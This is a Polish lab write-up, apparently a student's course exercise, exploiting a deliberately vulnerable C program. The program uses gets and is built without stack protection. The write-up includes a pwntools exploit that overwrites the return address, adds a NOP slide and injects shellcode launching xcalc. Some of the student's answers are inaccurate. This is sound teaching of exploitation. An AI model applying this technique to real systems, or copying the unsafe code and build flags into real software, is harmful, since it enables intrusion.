## Zad 1
**Przeprowadzanie ataku na podatną aplikację.**

Poniżej znajduje się kod aplikacji. należy stworzyć plik bof.c następnie wkleić do niego podany kod podany kod i zapisać.
```
// gcc bof.c -std=c99 -fno-stack-protector -z execstack -w -o bof

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void ask_for_name()
{
    char name[12] = {0};
    puts("What's your name?");
    gets(name);
    if(strlen(name) > 12) {
       puts("Nope, it's too long for me");
       exit(1);
    }
    printf("Hi %s!\n", name);
}

int main()
{
    int v;
    printf("STACK IS HERE => %p\n", &v);
    ask_for_name();
    return 0;
}
```
![TworzeniePliku](https://user-images.githubusercontent.com/56591106/70852068-60be3b80-1e9d-11ea-9c25-1badd2b3c1c8.PNG)
Przy pomocy polecenia znajdującego się w pierwszej lini (`gcc bof.c -std=c99 -fno-stack-protector -z execstack -w -o bof`)
kompilujemy zapisany kod, a następnie używając polecenia `./bof` uruchamiamy program.
![Uruchamianie](https://user-images.githubusercontent.com/56591106/70852152-56e90800-1e9e-11ea-991e-5f0f15d46342.PNG)
Teraz sprawdzamy działanie programy dla wpisanych imon krótszych i dłuższych niż 12 zanków.
![Imiona](https://user-images.githubusercontent.com/56591106/70852176-c9f27e80-1e9e-11ea-8896-89d00d35f838.PNG)

1. **Jakie ostrzeżenie zgłasza kompilator przy próbie skompilowania programu?**

Program zgłasza ostrzeżenie u użyciu niebezpiecznej funkcji get

2. **Na czym polega błąd w programie?**

Wpisując odpowiedni znak możemy sprawić by program "myślał" że zakończyliśmy wpisywanie i nie wyrzucił błędu. - \x00aaaaa" 

3. **Dlaczego program zamyka się poprawnie pomimo przepełnienia bufora?**

Ponieważ funkcja get obsluguje przypadki gdy wpiszemy zbyt dlugą 


Kolejnym krokiem jest przygotowanie eksploita, wykorzystamy do tego język Python i bibliotekę pwntools,
Tworzymy plik exploit.py i umieszczamy w nim poniższy kod.
```
from pwn import *

# Uruchomienie programu
p = process("./bof");

# Na samym poczatku program wyswietla adres miejsca na stosie
# (pozycja zmiennej "v" w ramach ramki stosu funkcji "main")
# Wykorzystamy go pozniej w naszym exploicie
p.readuntil("STACK IS HERE => ")
stack_ptr = int(p.readuntil("\n").strip(), 16)
p.readuntil("What's your name?\n")
# Teraz program czeka na wejscie
# === Tu wprowadzamy modyfikacje ===

name = "Alicja"

# =================================
# Wysylamy dane
p.sendline(name)
# ...i odbieramy odpowiedz programu
print(p.readall())
```
Teraz uruchamiamy naszego exploita poleceniem `python2 exploit.py` 
Jeśli program się nie wykonuje prawdopodobnie biblioteka `pwn` nie jest zainstalowana możemy to zrobic poleceniem `pip2 install --user pwntools`.
Jeśli polecenie nie wykona się należy pierw zastosować się do instrukcji (https://docs.pwntools.com/en/stable/install.html),
a następnie użyć polecenia `pip2 install --user pwntools`.Program powninien poprawnie się wykonać.
![UruchamianieExploita](https://user-images.githubusercontent.com/56591106/70852463-f8258d80-1ea1-11ea-8941-e31a5b264b8d.PNG)

Podmieńmy teraz `name = "Alicja"` na:
```
name = "Alicja\x00aaaaa"
name += "a"*14
```

I ponownie wykonajmy program, tym razam program zakończył się wyjątkiem (SIGSEGV)
![Wyjątek](https://user-images.githubusercontent.com/56591106/70852581-47b88900-1ea3-11ea-977e-4f3f3dfd42fa.PNG)
Aby lepiej zrozumieć co się teraz wydazło możemy skorzystać z debuggera `GDB`, jeśli nie jest on zainstalowany robimy to poleceniem
`sudo apt-get install gdb`, podmieńmy wcześniejszy fragment na następujący kod:
```
name = "Alicja\x00aaaaa"
name += "a"*12
gdb.attach(p)
```
Uruchamiamy skrypt (python2 exploiy.py), urochomi nam się nowe okno GDB, wpisujemy w nim pierw polecenie `c` a nastepnie `info registers`
Możemy teraz przeglądać stany rejestrów w momencie zakończenia programu
![GDBaaaaa](https://user-images.githubusercontent.com/56591106/70852749-70418280-1ea5-11ea-9c0c-0564de9369cf.PNG)
![gdb](https://user-images.githubusercontent.com/56591106/71308383-4388f000-23fc-11ea-8b11-92c355009db3.PNG)

**4. Jaka jest wartość rejestrów RBP i RIP? Dlaczego?**

Możemy zauważyć że stan rejestru `RBP`=`0x6161616161616161` został on nadpisany wartością `aaaaaaaaaaaa`
Stan rejestru `RIP` =07fff6852ba90

**5. Dlaczego program zakończył działanie**

Ponieważ adres powrotu nie został nadpisanu

Skoro potrafimy wprowadzić do rejestru RIP dowolną wartość, możemy przekierować działanie programu w dowolne miejsce. 
Tym razem przekierumy wykonywanie kodu do funkcji main, którego adres wyświetlany 
jest na początku wykonywania programu. Adres ten umieścimy w miejscu, tam gdzie
znajduje się adres powrotu.
```
name = "Alicja\x00aaaaa"
name += "a"*8          # rbp
name += p64(stack_ptr) # rip
```

Wykorzystamy teraz instrukcje NOP Slide (jednobajtowa pusta instrukcja nie wywołująca żadnych skutków ubocznych) w telu przesunięcia w skaźnika
do miejsca gdzie umieścimy docelowy kod

```
name = "Alicja\x00aaaaa"
name += "a"*8          # rbp
name += p64(stack_ptr) # rip
# NOP slide
name += '\x90' * 128 # nasza pusta instrukcja
name += '\xCC' # instrukcja breakpointu, program przerwie działanie, uruchomi się debugger
gdb.attach(p)
```

Uruchommy ponownie skrypt, po uruchomieniu debuggera `GDB` wpisujemy następujace komendy `c`,`info proc mappings`,`x/16i $rip-8`,
widzimy teraz w którym momencje zatrzymał się nasz program, instrukcje które przed chwilą zostały wykonane(nop, int3)  i te które są kolejne na stosie(add).
![BreakPoint](https://user-images.githubusercontent.com/56591106/70853318-9880af80-1eac-11ea-9d7d-fa25f7e9f929.PNG)

**6. Pod jakim adresem zatrzymał się program? Pod jakim zakresem adresów znajduje się stos?**

Program zatrzymał się pod adresem wskazanym na screenie , 0x7ffe47b26fe1

**7. Jakie instrukcje znajdują się w sąsiedztwie miejsca, w którym zatrzymał się program?**

Instrukcje puste nop i instrukcje dodawania add.

**8. Wzów działanie programu poleceniem c. Dlaczego program się scrashował?**

Procesor dostał jakieś instrukcje add wyrwane z kontekstu, nie wiedział co z nimi zrobić, program się wysypał

Potrafimy już nadpisywać wartości rejestrów oraz stosu, jesteśmy więc w statnie przystąpić do wstrzyknięcia shellcodu
przejmujac kontrolę nad programem. Zmodyfikujmy naszego exploita, wstawiając do niego podany kod:
```
name = "Alicja\x00aaaaa"
name += "a"*8          # rbp
name += p64(stack_ptr) # rip
# NOP slide
name += '\x90' * 128

shellcode = unhex(
"48b82f7863616c6300005048b82f7573722f62696e"
"504889e74831c050574889e64831d248c7c03a3100"
"005048b8444953504c41593d504889e24831c05052"
"4889e248c7c03b0000000f0500")
name += shellcode
```
Teraz po uruchomieniu exploita wartości na sosie zostaną nadpisane po czym wykonają się instrukcje zapisane w shellcodzie 
zostatnie uruchomiony program `xcal`

**9. Wykonaj zrzut ekranu przedstawiający efekt wykonania exploita.**

![xCAL](https://user-images.githubusercontent.com/56591106/70853435-6e2ff180-1eae-11ea-8de9-81cb4afb1ec3.PNG)

**10. Dlaczego po zamknięciu okna kalkulatora program zakończył się poprawnie? (Podpowiedź: "xcalc" wywołany został przez shellcode za pomocą funkcji systemowej exec )**
Po uruchomieniu kalkulatora zaczynają się wykonwywać jego instrukcje, po zamknięciu wszystko się zamyka.




